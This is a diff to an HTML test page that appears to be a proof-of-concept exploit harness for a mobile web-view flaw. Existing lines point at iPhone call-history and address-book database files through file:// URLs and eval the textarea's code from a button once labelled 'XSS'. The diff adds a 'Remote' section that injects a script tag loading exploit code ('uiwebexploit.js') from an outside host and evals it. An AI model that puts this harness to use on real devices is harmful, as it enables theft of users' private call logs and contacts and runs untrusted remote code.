@@ -1,5 +1,17 @@
 <html>
-  <textarea id="test">
+<head>
+<style type="text/css">
+  body {
+    padding: 50px 0 0 0;
+  }
+</style>
+</head>
+<body>
+
+<div>  
+<h2>Local</2>
+<div>
+<textarea id="test" rows=10 cols=50>
     // http://ma.la/tmp/boxcar.js
     //var file = 'file:///private/var/wireless/Library/CallHistory/call_history.db';
     //var file = 'file:///private/var/mobile/Library/AddressBook/AddressBook.sqlitedb';
@@ -14,6 +26,25 @@
     } catch(e){
       alert(e)
     }
-  </textarea>
-  <button onclick="eval(document.getElementById('test').value);">XSS</button>
+</textarea>
+</div>
+<button onclick="eval(document.getElementById('test').value);">Eval Local code</button>
+</div>
+
+<div>
+<h2>Remote</2>
+<div>
+<textarea id="test-remote" rows=10 cols=50>
+  var script = document.createElement('script');
+  var head = document.getElementsByTagName('head')[0];
+  script.src = 'http://lai.so/tmp/uiwebexploit.js';
+  head.appendChild(script);
+</textarea>
+</div>
+<button onclick="eval(document.getElementById('test-remote').value);">Eval Remote code</button>
+</div>
+  
+<img src="test.png">
+  
+</body>
 </html>
